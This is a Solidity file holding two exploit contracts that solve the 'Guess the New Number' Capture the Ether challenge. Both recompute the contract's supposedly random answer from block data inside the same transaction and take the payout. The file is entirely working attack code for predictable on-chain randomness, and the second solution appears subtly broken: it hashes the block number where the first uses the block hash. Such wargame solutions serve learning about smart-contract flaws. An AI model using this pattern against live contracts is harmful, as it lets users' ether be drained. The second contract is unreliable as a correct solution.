// Sol1 https://coinsbench.com/capture-the-ether-guess-the-new-number-fa8df008023c
pragma solidity ^0.8.0;

interface IGuessTheNewNumberChallenge {
    function guess(uint8 n) external payable;
}

contract GuessTheNewNumberSolver {

    IGuessTheNewNumberChallenge public challenge;
    address public owner;

    constructor(address _challengeAddress) {
        challenge = IGuessTheNewNumberChallenge(_challengeAddress);
        owner = msg.sender;
    }

    function solve() public payable {
        require(msg.sender == owner, "Only the owner can solve this challenge");
        require(msg.value == 1 ether, "You must send an ether, first");
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        challenge.guess{value: 1 ether}(answer);
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}

// Sol2

pragma solidity ^0.8.13;

contract Solve {
    address payable challenge;

    constructor(address payable _c) {
        challenge = _c;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function solveF() public payable{
        require(msg.value == 1 ether,"money?");
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(block.number - 1, block.timestamp))));
        (bool success, bytes memory data) = challenge.call{value: msg.value}(
            abi.encodeWithSignature("guess(uint8)", answer)
        );
        require(success,"Wrong"); 
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}

}
